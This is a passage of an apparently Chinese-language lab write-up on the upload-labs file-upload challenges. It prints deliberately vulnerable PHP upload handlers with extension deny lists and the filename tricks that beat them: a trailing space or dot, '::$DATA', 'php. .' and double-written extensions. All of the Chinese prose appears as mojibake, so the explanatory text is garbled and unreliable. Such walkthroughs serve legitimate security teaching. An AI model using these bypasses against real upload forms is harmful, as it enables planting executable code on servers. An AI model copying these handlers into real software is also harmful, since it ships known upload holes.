é™¤æœ«å°¾çš„ç‚¹ï¼Œä½†æ˜¯è¿™é‡Œæ²¡æœ‰å»æ‰æœ«å°¾çš„ç©ºæ ¼ï¼Œå› æ­¤ä¸Šä¼ ä¸€ä¸ª <code>.php</code> [ç©ºæ ¼]æ–‡ä»¶å³å¯</p></blockquote><p>ç»•è¿‡æ–¹æ³•</p><p>ä¿®æ”¹æ–‡ä»¶åç¼€ä¸º<code>1.php .</code>è¿™ç§å½¢å¼ï¼Œä»ä»£ç æ‰§è¡Œæµç¨‹åˆ†ææ¥çœ‹ï¼Œä¼šå…ˆå»é™¤æ–‡ä»¶åæœ«å°¾çš„.,å»é™¤ä¹‹åçš„æ–‡ä»¶åç¼€æ˜¯ <code>.php[ç©ºæ ¼]</code>ï¼Œåˆ©ç”¨<code>.php[ç©ºæ ¼]</code>ç»•è¿‡é»‘åå•ï¼Œç„¶ååˆ©ç”¨windowsçš„æ–‡ä»¶å‘½åè§„åˆ™é»˜è®¤é™¤å»ç©ºæ ¼å’Œ.,è¾¾åˆ°ä¸Šä¼ <code>.php</code>çš„ç›®çš„ã€‚</p><h1 id="ç‚¹ç»•è¿‡"><a href="#ç‚¹ç»•è¿‡" class="headerlink" title="ç‚¹ç»•è¿‡"></a>ç‚¹ç»•è¿‡</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//é¦–å°¾å»ç©º</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åŠ ä¸Šäº†é¦–å°¾å»ç©ºï¼Œä½†æ˜¯å´å°‘äº†å°¾éƒ¨å»ç‚¹ã€‚</p><blockquote><p>Winä¸‹xx.jpg[ç©ºæ ¼] æˆ–xx.jpg.è¿™ä¸¤ç±»æ–‡ä»¶éƒ½æ˜¯ä¸å…è®¸å­˜åœ¨çš„ï¼Œè‹¥è¿™æ ·å‘½åï¼Œwindowsä¼šé»˜è®¤é™¤å»ç©ºæ ¼æˆ–ç‚¹<br>æ­¤å¤„ä¼šåˆ é™¤æœ«å°¾çš„ç‚¹ï¼Œä½†æ˜¯æ²¡æœ‰å»æ‰æœ«å°¾çš„ç‚¹ï¼Œå› æ­¤ä¸Šä¼ ä¸€ä¸ª <code>.php.</code> æ–‡ä»¶å³å¯</p></blockquote><p>ç»•è¿‡æ–¹æ³•</p><p>ç”¨<code>burp</code>å°†ä¸Šä¼ æ–‡ä»¶åç¼€æ”¹ä¸º<code>.php.</code>å³å¯ã€‚</p><h1 id="DATAç»•è¿‡"><a href="#DATAç»•è¿‡" class="headerlink" title="::$DATAç»•è¿‡"></a>::$DATAç»•è¿‡</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//é¦–å°¾å»ç©º</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜æ˜¯åˆ©ç”¨windowsçš„ä¸€ä¸ªç‰¹æ€§ï¼š</p><blockquote><p>NTFSæ–‡ä»¶ç³»ç»ŸåŒ…æ‹¬å¯¹å¤‡ç”¨æ•°æ®æµçš„æ”¯æŒã€‚è¿™ä¸æ˜¯ä¼—æ‰€å‘¨çŸ¥çš„åŠŸèƒ½ï¼Œä¸»è¦åŒ…æ‹¬æä¾›ä¸Macintoshæ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶çš„å…¼å®¹æ€§ã€‚å¤‡ç”¨æ•°æ®æµå…è®¸æ–‡ä»¶åŒ…å«å¤šä¸ªæ•°æ®æµã€‚æ¯ä¸ªæ–‡ä»¶è‡³å°‘æœ‰ä¸€ä¸ªæ•°æ®æµã€‚åœ¨Windowsä¸­ï¼Œæ­¤é»˜è®¤æ•°æ®æµç§°ä¸ºï¼š$ DATAã€‚</p></blockquote><p>ç®€å•è®²å°±æ˜¯åœ¨<code>php</code>+<code>windows</code>çš„æƒ…å†µä¸‹ï¼šå¦‚æœ<code>æ–‡ä»¶å</code>+<code>::$DATA</code>ä¼šæŠŠ<code>::$DATA</code>ä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†ï¼Œä¸ä¼šæ£€æµ‹åç¼€åã€‚ä¸”ä¿æŒ<code>::$DATA</code>ä¹‹å‰çš„æ–‡ä»¶åã€‚</p><p><strong>æ³¨ï¼šä»…windowsé€‚ç”¨</strong></p><p>ç»•è¿‡æ–¹æ³•</p><p>ç”¨burpå°†ä¸Šä¼ æ–‡ä»¶åç¼€æ”¹ä¸º: <code>xx.php::$DATA</code>å³å¯</p><h1 id="ç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡"><a href="#ç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡" class="headerlink" title="ç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡"></a>ç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//é¦–å°¾å»ç©º</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ä»£ç é€»è¾‘æ˜¯å…ˆåˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ï¼Œå†è¿›è¡Œé¦–å°¾å»ç©ºã€‚éƒ½åªè¿›è¡Œä¸€æ¬¡ã€‚æ•…å¯ä»¥æ„é€ ç‚¹ç©ºæ ¼ç‚¹è¿›è¡Œç»•è¿‡ï¼Œä¹Ÿå°±æ˜¯åç¼€åæ”¹ä¸º<code>xx.php. .</code>ï¼Œä¹Ÿæ˜¯åˆ©ç”¨äº†Windowsçš„ç‰¹æ€§ã€‚å°†åç¼€åæ”¹ä¸º<code>xx.php. .</code>å³å¯ã€‚</p><p>å¦‚æœç›®æ ‡æœåŠ¡å™¨æ˜¯windowsç³»ç»Ÿçš„è¯ï¼Œå‡å¯ç”¨ç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡ã€‚</p><h1 id="åŒå†™ç»•è¿‡"><a href="#åŒå†™ç»•è¿‡" class="headerlink" title="åŒå†™ç»•è¿‡"></a>åŒå†™ç»•è¿‡</h1><p>è¿™æ˜¯ä¸ªæ¯”è¾ƒç»å…¸çš„ç»•è¿‡æ–¹å¼äº†ï¼Œåˆ†æä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ²¡æœ‰å»é™¤æ–‡ä»¶å°¾ç‚¹ã€ç©ºæ 